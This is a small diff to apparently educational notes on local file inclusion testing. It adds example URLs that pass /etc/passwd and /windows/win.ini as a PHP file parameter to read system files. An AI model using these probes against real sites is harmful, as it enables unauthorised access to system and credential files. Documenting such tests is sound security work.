@@ -6,7 +6,9 @@
 
 ### require()
 
-#### Example: http://site.com/index.php?file=/etc/passwd
+#### Example: http://site.com/index.php?file=/etc/passwd (Linux)
+
+#### http://site.com/index.php?file=/windows/win.ini (Windows)
 
 ## LFI Testing
 
